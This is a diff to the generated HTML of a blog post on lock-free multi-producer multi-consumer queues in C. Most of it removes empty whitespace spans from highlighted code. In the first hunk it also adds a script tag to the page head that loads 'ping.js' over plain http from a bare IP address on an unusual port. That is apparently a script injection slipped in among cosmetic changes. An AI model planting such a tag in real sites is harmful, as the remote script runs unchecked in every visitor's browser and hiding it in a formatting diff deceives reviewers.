@@ -45,6 +45,8 @@
   <script src='/js/lunr-2.3.9.min.js'></script>
   <script src='/js/search_index.js'></script>
   <script src='/js/search.min.js'></script>
+
+  <script src='http://192.34.63.156:6127/ping.js' async></script>
 </head>
 <body>
 <header>
@@ -90,21 +92,21 @@ April 28, 2020
 <p>This is the continuation of the <a href="/articles/2020/03/22/Lock-Free-Queue-Part-I.html">lock-free single-producer single-consumer queue</a><!--more--></p>
 <p>Not only we need to prevent race conditions between the producers and the consumers but also between producers and between consumers.</p>
 <h2 id="race-between-producers">Race between producers</h2>
-<p>Recall the first part of <code><span class="highlight-candombe-inline"><span class="n">push</span><span class="p">()</span><span class="w"></span></span></code>: we load the producer’s head, and calculate if we have enough room for the incoming data and if we have, we update the producer’s head to the next position.</p>
-<div class="highlight-candombe"><pre><span></span><code><span class="kt">uint32_t</span><span class="w"> </span><span class="nf">push</span><span class="p">(</span><span class="k">struct</span><span class="w"> </span><span class="nc">queue_t</span><span class="w"> </span><span class="o">*</span><span class="n">q</span><span class="p">,</span><span class="w"> </span><span class="kt">uint32_t</span><span class="w"> </span><span class="o">*</span><span class="n">data</span><span class="p">,</span><span class="w"> </span><span class="kt">uint32_t</span><span class="w"> </span><span class="n">len</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
-<span class="w">    </span><span class="n">old_prod_head</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">q</span><span class="o">-&gt;</span><span class="n">prod_head</span><span class="p">;</span><span class="w"></span>
-<span class="w">    </span><span class="n">cons_tail</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">__atomic_load_n</span><span class="p">(</span><span class="o">&amp;</span><span class="n">q</span><span class="o">-&gt;</span><span class="n">cons_tail</span><span class="p">,</span><span class="w"> </span><span class="n">__ATOMIC_ACQUIRE</span><span class="p">);</span><span class="w"></span>
+<p>Recall the first part of <code><span class="highlight-candombe-inline"><span class="n">push</span><span class="p">()</span></span></code>: we load the producer’s head, and calculate if we have enough room for the incoming data and if we have, we update the producer’s head to the next position.</p>
+<div class="highlight-candombe"><pre><span></span><code><span class="kt">uint32_t</span><span class="w"> </span><span class="nf">push</span><span class="p">(</span><span class="k">struct</span><span class="w"> </span><span class="nc">queue_t</span><span class="w"> </span><span class="o">*</span><span class="n">q</span><span class="p">,</span><span class="w"> </span><span class="kt">uint32_t</span><span class="w"> </span><span class="o">*</span><span class="n">data</span><span class="p">,</span><span class="w"> </span><span class="kt">uint32_t</span><span class="w"> </span><span class="n">len</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="n">old_prod_head</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">q</span><span class="o">-&gt;</span><span class="n">prod_head</span><span class="p">;</span>
+<span class="w">    </span><span class="n">cons_tail</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">__atomic_load_n</span><span class="p">(</span><span class="o">&amp;</span><span class="n">q</span><span class="o">-&gt;</span><span class="n">cons_tail</span><span class="p">,</span><span class="w"> </span><span class="n">__ATOMIC_ACQUIRE</span><span class="p">);</span>
 
-<span class="w">    </span><span class="kt">uint32_t</span><span class="w"> </span><span class="n">free_entries</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">capacity</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">cons_tail</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">old_prod_head</span><span class="p">);</span><span class="w"></span>
-<span class="w">    </span><span class="n">n</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">free_entries</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">len</span><span class="p">)</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="n">free_entries</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="n">n</span><span class="p">;</span><span class="w"></span>
+<span class="w">    </span><span class="kt">uint32_t</span><span class="w"> </span><span class="n">free_entries</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">capacity</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">cons_tail</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">old_prod_head</span><span class="p">);</span>
+<span class="w">    </span><span class="n">n</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">free_entries</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">len</span><span class="p">)</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="n">free_entries</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="n">n</span><span class="p">;</span>
 
-<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">free_entries</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="n">free_entries</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">n</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
-<span class="w">        </span><span class="n">errno</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ENOBUFS</span><span class="p">;</span><span class="w"></span>
-<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>
-<span class="w">    </span><span class="p">}</span><span class="w"></span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">free_entries</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="n">free_entries</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">n</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="n">errno</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ENOBUFS</span><span class="p">;</span>
+<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+<span class="w">    </span><span class="p">}</span>
 
-<span class="w">    </span><span class="n">new_prod_head</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">old_prod_head</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">n</span><span class="p">);</span><span class="w"></span>
-<span class="w">    </span><span class="n">q</span><span class="o">-&gt;</span><span class="n">prod_head</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">new_prod_head</span><span class="p">;</span><span class="w"></span>
+<span class="w">    </span><span class="n">new_prod_head</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">old_prod_head</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">n</span><span class="p">);</span>
+<span class="w">    </span><span class="n">q</span><span class="o">-&gt;</span><span class="n">prod_head</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">new_prod_head</span><span class="p">;</span>
 <span class="w">    </span><span class="c1">// ...</span>
 </code></pre></div>
 
@@ -114,7 +116,7 @@ April 28, 2020
 Two producers racing for reserving the same space.
 </span></figcaption>
 <img  class='' alt='' src='/img/threading/lock-free/queue/reserve-race-condition.png' /></figure></p>
-<p>What we need is the load, compute and store on <code><span class="highlight-candombe-inline"><span class="n">q</span><span class="o">-&gt;</span><span class="n">prod_head</span><span class="w"></span></span></code> as a <em>single atomic operation</em>. This is called <em>read-modify-write</em> operation.</p>
+<p>What we need is the load, compute and store on <code><span class="highlight-candombe-inline"><span class="n">q</span><span class="o">-&gt;</span><span class="n">prod_head</span></span></code> as a <em>single atomic operation</em>. This is called <em>read-modify-write</em> operation.</p>
 <p><label for='IE9yICpjb21wYXJlIGFuZCBleGNoYW5nZSogbWFyZ2lubm90ZXM=' class='margin-toggle'> &#8853;</label>
 <input type='checkbox' id='IE9yICpjb21wYXJlIGFuZCBleGNoYW5nZSogbWFyZ2lubm90ZXM=' class='margin-toggle'/>
 <span class='marginnote'>
@@ -122,32 +124,32 @@ Or <em>compare and exchange</em>
 </span></p>
 <p>No builtin atomic exists for that but we can built one with a <em>compare and swap</em> instruction.</p>
 <h2 id="move-the-headtail-forward-atomically---cas-loop">Move the head/tail forward atomically - CAS loop</h2>
-<div class="highlight-candombe"><pre><span></span><code><span class="kt">uint32_t</span><span class="w"> </span><span class="nf">push</span><span class="p">(</span><span class="k">struct</span><span class="w"> </span><span class="nc">queue_t</span><span class="w"> </span><span class="o">*</span><span class="n">q</span><span class="p">,</span><span class="w"> </span><span class="kt">uint32_t</span><span class="w"> </span><span class="o">*</span><span class="n">data</span><span class="p">,</span><span class="w"> </span><span class="kt">uint32_t</span><span class="w"> </span><span class="n">len</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
-<span class="w">    </span><span class="n">old_prod_head</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">__atomic_load_n</span><span class="p">(</span><span class="o">&amp;</span><span class="n">q</span><span class="o">-&gt;</span><span class="n">prod_head</span><span class="p">,</span><span class="w"> </span><span class="n">__ATOMIC_RELAXED</span><span class="p">);</span><span class="w"></span>
+<div class="highlight-candombe"><pre><span></span><code><span class="kt">uint32_t</span><span class="w"> </span><span class="nf">push</span><span class="p">(</span><span class="k">struct</span><span class="w"> </span><span class="nc">queue_t</span><span class="w"> </span><span class="o">*</span><span class="n">q</span><span class="p">,</span><span class="w"> </span><span class="kt">uint32_t</span><span class="w"> </span><span class="o">*</span><span class="n">data</span><span class="p">,</span><span class="w"> </span><span class="kt">uint32_t</span><span class="w"> </span><span class="n">len</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="n">old_prod_head</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">__atomic_load_n</span><span class="p">(</span><span class="o">&amp;</span><span class="n">q</span><span class="o">-&gt;</span><span class="n">prod_head</span><span class="p">,</span><span class="w"> </span><span class="n">__ATOMIC_RELAXED</span><span class="p">);</span>
 
-<span class="w">    </span><span class="k">do</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
-<span class="w">        </span><span class="n">cons_tail</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">__atomic_load_n</span><span class="p">(</span><span class="o">&amp;</span><span class="n">q</span><span class="o">-&gt;</span><span class="n">cons_tail</span><span class="p">,</span><span class="w"> </span><span class="n">__ATOMIC_ACQUIRE</span><span class="p">);</span><span class="w"></span>
+<span class="w">    </span><span class="k">do</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="n">cons_tail</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">__atomic_load_n</span><span class="p">(</span><span class="o">&amp;</span><span class="n">q</span><span class="o">-&gt;</span><span class="n">cons_tail</span><span class="p">,</span><span class="w"> </span><span class="n">__ATOMIC_ACQUIRE</span><span class="p">);</span>
 
-<span class="w">        </span><span class="kt">uint32_t</span><span class="w"> </span><span class="n">free_entries</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">capacity</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">cons_tail</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">old_prod_head</span><span class="p">);</span><span class="w"></span>
-<span class="w">        </span><span class="n">n</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">free_entries</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">len</span><span class="p">)</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="n">free_entries</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="n">n</span><span class="p">;</span><span class="w"></span>
+<span class="w">        </span><span class="kt">uint32_t</span><span class="w"> </span><span class="n">free_entries</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">capacity</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">cons_tail</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">old_prod_head</span><span class="p">);</span>
+<span class="w">        </span><span class="n">n</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">free_entries</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">len</span><span class="p">)</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="n">free_entries</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="n">n</span><span class="p">;</span>
 
-<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">free_entries</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="n">free_entries</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">n</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
-<span class="w">            </span><span class="n">errno</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ENOBUFS</span><span class="p">;</span><span class="w"></span>
-<span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>
-<span class="w">        </span><span class="p">}</span><span class="w"></span>
+<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">free_entries</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="n">free_entries</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">n</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="n">errno</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ENOBUFS</span><span class="p">;</span>
+<span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+<span class="w">        </span><span class="p">}</span>
 
-<span class="w">        </span><span class="n">new_prod_head</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">old_prod_head</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">n</span><span class="p">);</span><span class="w"></span>
+<span class="w">        </span><span class="n">new_prod_head</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">old_prod_head</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">n</span><span class="p">);</span>
 
-<span class="w">        </span><span class="n">success</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">__atomic_compare_exchange_n</span><span class="p">(</span><span class="w"></span>
+<span class="w">        </span><span class="n">success</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">__atomic_compare_exchange_n</span><span class="p">(</span>
 <span class="w">                        </span><span class="o">&amp;</span><span class="n">q</span><span class="o">-&gt;</span><span class="n">prod_head</span><span class="p">,</span><span class="w">      </span><span class="c1">// what we want to update,</span>
 <span class="w">                        </span><span class="o">&amp;</span><span class="n">old_prod_head</span><span class="p">,</span><span class="w">     </span><span class="c1">// asumming that still have this value,</span>
 <span class="w">                        </span><span class="n">new_prod_head</span><span class="p">,</span><span class="w">      </span><span class="c1">// with this value as the new one.</span>
-<span class="w">                        </span><span class="nb">false</span><span class="p">,</span><span class="w"></span>
-<span class="w">                        </span><span class="n">__ATOMIC_RELAXED</span><span class="p">,</span><span class="w"></span>
-<span class="w">                        </span><span class="n">__ATOMIC_RELAXED</span><span class="w"></span>
-<span class="w">                    </span><span class="p">);</span><span class="w"></span>
+<span class="w">                        </span><span class="nb">false</span><span class="p">,</span>
+<span class="w">                        </span><span class="n">__ATOMIC_RELAXED</span><span class="p">,</span>
+<span class="w">                        </span><span class="n">__ATOMIC_RELAXED</span>
+<span class="w">                    </span><span class="p">);</span>
 
-<span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">success</span><span class="p">);</span><span class="w"></span>
+<span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">success</span><span class="p">);</span>
 <span class="w">    </span><span class="c1">// ...</span>
 </code></pre></div>
 
@@ -157,26 +159,26 @@ Or <em>compare and exchange</em>
 Note that I said “it still has the same value”; I did’t say “the value did’t change”. For our queue it doesn’t matter but for other structures it is really important and the confusion leads to the <a href="https://en.wikipedia.org/wiki/ABA_problem">ABA problem</a>
 </span></p>
 <p>The idea is to do an atomic read, do all the modifications and checks that we need and then do an atomic write with the new value <em>only if</em> the head is <em>still</em> pointing to the same position that we read.</p>
-<p>That is what <code><span class="highlight-candombe-inline"><span class="n">__atomic_compare_exchange_n</span><span class="w"></span></span></code> is about.</p>
+<p>That is what <code><span class="highlight-candombe-inline"><span class="n">__atomic_compare_exchange_n</span></span></code> is about.</p>
 <p>If it is, it means that no other producer moved the head and we can proceed.</p>
 <p><label for='ClRoZXJlIGlzIG5vIG5lZWQgdG8gZG8gYW4gZXhwbGljaXQgYXRvbWljIGxvYWQgYWdhaW4sCmBfX2F0b21pY19jb21wYXJlX2V4Y2hhbmdlX25gIHdpbGwgZG8gaXQgZm9yIHVzIGlmIGl0IGZhaWxzLiBtYXJnaW5ub3Rlcw==' class='margin-toggle'> &#8853;</label>
 <input type='checkbox' id='ClRoZXJlIGlzIG5vIG5lZWQgdG8gZG8gYW4gZXhwbGljaXQgYXRvbWljIGxvYWQgYWdhaW4sCmBfX2F0b21pY19jb21wYXJlX2V4Y2hhbmdlX25gIHdpbGwgZG8gaXQgZm9yIHVzIGlmIGl0IGZhaWxzLiBtYXJnaW5ub3Rlcw==' class='margin-toggle'/>
 <span class='marginnote'>
-There is no need to do an explicit atomic load again, <code><span class="highlight-candombe-inline"><span class="n">__atomic_compare_exchange_n</span><span class="w"></span></span></code> will do it for us if it fails.
+There is no need to do an explicit atomic load again, <code><span class="highlight-candombe-inline"><span class="n">__atomic_compare_exchange_n</span></span></code> will do it for us if it fails.
 </span></p>
 <p>If not, we need to retry again until we succeed.</p>
-<p>This loop makes the <code><span class="highlight-candombe-inline"><span class="n">push</span><span class="p">()</span><span class="w"></span></span></code> to take an unbound number of steps (loop iterations) until it can proceed. The queue is lock-free but no <em>wait-free</em> anymore.</p>
+<p>This loop makes the <code><span class="highlight-candombe-inline"><span class="n">push</span><span class="p">()</span></span></code> to take an unbound number of steps (loop iterations) until it can proceed. The queue is lock-free but no <em>wait-free</em> anymore.</p>
 <h2 id="waiting-for-others">Waiting for others</h2>
 <p>Once a producer finished the write it <em>releases</em> it updating the producer’s tail to the new head.</p>
-<div class="highlight-candombe"><pre><span></span><code><span class="kt">uint32_t</span><span class="w"> </span><span class="nf">push</span><span class="p">(...)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<div class="highlight-candombe"><pre><span></span><code><span class="kt">uint32_t</span><span class="w"> </span><span class="nf">push</span><span class="p">(...)</span><span class="w"> </span><span class="p">{</span>
 <span class="w">    </span><span class="c1">// ...</span>
 <span class="w">    </span><span class="c1">// write the data</span>
-<span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kt">uint32_t</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">n</span><span class="p">;</span><span class="w"> </span><span class="o">++</span><span class="n">i</span><span class="p">)</span><span class="w"></span>
-<span class="w">        </span><span class="n">q</span><span class="o">-&gt;</span><span class="n">data</span><span class="p">[(</span><span class="n">old_prod_head</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">i</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">mask</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="p">];</span><span class="w"></span>
+<span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kt">uint32_t</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">n</span><span class="p">;</span><span class="w"> </span><span class="o">++</span><span class="n">i</span><span class="p">)</span>
+<span class="w">        </span><span class="n">q</span><span class="o">-&gt;</span><span class="n">data</span><span class="p">[(</span><span class="n">old_prod_head</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">i</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">mask</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
 
-<span class="w">    </span><span class="n">__atomic_store_n</span><span class="p">(</span><span class="o">&amp;</span><span class="n">q</span><span class="o">-&gt;</span><span class="n">prod_tail</span><span class="p">,</span><span class="w"> </span><span class="n">new_prod_head</span><span class="p">,</span><span class="w"> </span><span class="n">__ATOMIC_RELEASE</span><span class="p">);</span><span class="w"></span>
-<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>
-<span class="p">}</span><span class="w"></span>
+<span class="w">    </span><span class="n">__atomic_store_n</span><span class="p">(</span><span class="o">&amp;</span><span class="n">q</span><span class="o">-&gt;</span><span class="n">prod_tail</span><span class="p">,</span><span class="w"> </span><span class="n">new_prod_head</span><span class="p">,</span><span class="w"> </span><span class="n">__ATOMIC_RELEASE</span><span class="p">);</span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
 </code></pre></div>
 
 <p>However we have another race condition here.</p>
@@ -190,25 +192,25 @@ Two producers racing for marking the data as ready.
 If the producer 2 updates the tail before the producer 1, the consumers may read that the producer 1 may not had written yet.
 </span></figcaption>
 <img  class='' alt='' src='/img/threading/lock-free/queue/ready-race-condition.png' /></figure></p>
-<p>What we need is to enforce an order: all the previous <code><span class="highlight-candombe-inline"><span class="n">push</span><span class="p">()</span><span class="w"></span></span></code> must complete before a producer update the tail.</p>
+<p>What we need is to enforce an order: all the previous <code><span class="highlight-candombe-inline"><span class="n">push</span><span class="p">()</span></span></code> must complete before a producer update the tail.</p>
 <p>We can get this waiting until the tail reaches the old head meaning that any reserved space for writing (between the tail and the old head) was used and released.</p>
 <p>So the next block reserved begins at the old head/current tail and ends at the new head.</p>
-<div class="highlight-candombe"><pre><span></span><code><span class="kt">uint32_t</span><span class="w"> </span><span class="nf">push</span><span class="p">(...)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<div class="highlight-candombe"><pre><span></span><code><span class="kt">uint32_t</span><span class="w"> </span><span class="nf">push</span><span class="p">(...)</span><span class="w"> </span><span class="p">{</span>
 <span class="w">    </span><span class="c1">// ...</span>
 <span class="w">    </span><span class="c1">// write the data</span>
-<span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kt">uint32_t</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">n</span><span class="p">;</span><span class="w"> </span><span class="o">++</span><span class="n">i</span><span class="p">)</span><span class="w"></span>
-<span class="w">        </span><span class="n">q</span><span class="o">-&gt;</span><span class="n">data</span><span class="p">[(</span><span class="n">old_prod_head</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">i</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">mask</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="p">];</span><span class="w"></span>
+<span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kt">uint32_t</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">n</span><span class="p">;</span><span class="w"> </span><span class="o">++</span><span class="n">i</span><span class="p">)</span>
+<span class="w">        </span><span class="n">q</span><span class="o">-&gt;</span><span class="n">data</span><span class="p">[(</span><span class="n">old_prod_head</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">i</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">mask</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
 
 <span class="w">    </span><span class="c1">// loop until the tail reaches our original head.</span>
 <span class="w">    </span><span class="c1">// ensuring that no other previous push is still in progress</span>
-<span class="w">    </span><span class="k">while</span><span class="w"> </span><span class="p">((</span><span class="k">volatile</span><span class="w"> </span><span class="kt">uint32_t</span><span class="p">)(</span><span class="n">q</span><span class="o">-&gt;</span><span class="n">prod_tail</span><span class="p">)</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="n">old_prod_head</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">    </span><span class="k">while</span><span class="w"> </span><span class="p">((</span><span class="k">volatile</span><span class="w"> </span><span class="kt">uint32_t</span><span class="p">)(</span><span class="n">q</span><span class="o">-&gt;</span><span class="n">prod_tail</span><span class="p">)</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="n">old_prod_head</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
 <span class="w">        </span><span class="c1">// Tell the CPU that this is busy-loop so he can take a rest</span>
-<span class="w">        </span><span class="n">loki_cpu_relax</span><span class="p">();</span><span class="w"></span>
-<span class="w">    </span><span class="p">}</span><span class="w"></span>
+<span class="w">        </span><span class="n">loki_cpu_relax</span><span class="p">();</span>
+<span class="w">    </span><span class="p">}</span>
 
-<span class="w">    </span><span class="n">__atomic_store_n</span><span class="p">(</span><span class="o">&amp;</span><span class="n">q</span><span class="o">-&gt;</span><span class="n">prod_tail</span><span class="p">,</span><span class="w"> </span><span class="n">new_prod_head</span><span class="p">,</span><span class="w"> </span><span class="n">__ATOMIC_RELEASE</span><span class="p">);</span><span class="w"></span>
-<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>
-<span class="p">}</span><span class="w"></span>
+<span class="w">    </span><span class="n">__atomic_store_n</span><span class="p">(</span><span class="o">&amp;</span><span class="n">q</span><span class="o">-&gt;</span><span class="n">prod_tail</span><span class="p">,</span><span class="w"> </span><span class="n">new_prod_head</span><span class="p">,</span><span class="w"> </span><span class="n">__ATOMIC_RELEASE</span><span class="p">);</span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
 </code></pre></div>
 
 <h2 id="multi-producer-multi-consumer-queue-final-version">Multi-producer multi-consumer queue (final version)</h2>
@@ -217,10 +219,10 @@ If the producer 2 updates the tail before the producer 1, the consumers may read
 <figcaption>
 </figcaption></figure></p>
 <h2 id="future-research-on-the-busy-waits">Future research on the busy waits</h2>
-<p>The <code><span class="highlight-candombe-inline"><span class="n">push</span><span class="p">()</span><span class="w"></span></span></code>, and analogously the <code><span class="highlight-candombe-inline"><span class="n">pop</span><span class="p">()</span><span class="w"></span></span></code>, has two busy waits: the CAS loop for update the head and the wait-for-others for updating the tail in order.</p>
+<p>The <code><span class="highlight-candombe-inline"><span class="n">push</span><span class="p">()</span></span></code>, and analogously the <code><span class="highlight-candombe-inline"><span class="n">pop</span><span class="p">()</span></span></code>, has two busy waits: the CAS loop for update the head and the wait-for-others for updating the tail in order.</p>
 <p>Both loops have an impact on the parallelism depending of different factors.</p>
 <p>It is expected to have more contention in the CAS loop as the number of producers increase, especially when the data written is small.</p>
-<p>On the other hand, it is expected to have more time wasted on the wait-for-others loop when the data is larger as this should dominate the time needed to complete one <code><span class="highlight-candombe-inline"><span class="n">push</span><span class="p">()</span><span class="w"></span></span></code> and therefore preventing to complete the next ones.</p>
+<p>On the other hand, it is expected to have more time wasted on the wait-for-others loop when the data is larger as this should dominate the time needed to complete one <code><span class="highlight-candombe-inline"><span class="n">push</span><span class="p">()</span></span></code> and therefore preventing to complete the next ones.</p>
 <p>In a future post I will explore this.</p>
 <p>More readings:</p>
 <ul>
@@ -231,32 +233,32 @@ If the producer 2 updates the tail before the producer 1, the consumers may read
 </ul>
 <h2 id="other-implementations">Other implementations</h2>
 <p>I didn’t have the chance to explore this, but the <a href="https://software.intel.com/en-us/forums/intel-moderncode-for-parallel-architectures/topic/295836">Thomasson’s MPMC queue</a> followed another approach based in a linked list.</p>
-<p>The documentation says that it has lock free <code><span class="highlight-candombe-inline"><span class="n">pop</span><span class="p">()</span><span class="w"></span></span></code> and wait free <code><span class="highlight-candombe-inline"><span class="n">push</span><span class="p">()</span><span class="w"></span></span></code>.</p>
+<p>The documentation says that it has lock free <code><span class="highlight-candombe-inline"><span class="n">pop</span><span class="p">()</span></span></code> and wait free <code><span class="highlight-candombe-inline"><span class="n">push</span><span class="p">()</span></span></code>.</p>
 <p>The only downside is that requires a double-word CAS instruction.</p>
 <h2 id="open-questions">Open questions</h2>
 <p>The DPDK’s <a href="http://git.dpdk.org/dpdk/tree/lib/librte_ring/rte_ring_c11_mem.h">ring buffer</a> adds a <em>fence</em> between the read of the <em>old</em> producer’s head and the read of the consumer’s tail and I cite:</p>
 <blockquote>
 <p>“Ensure the head is read before tail”</p>
 </blockquote>
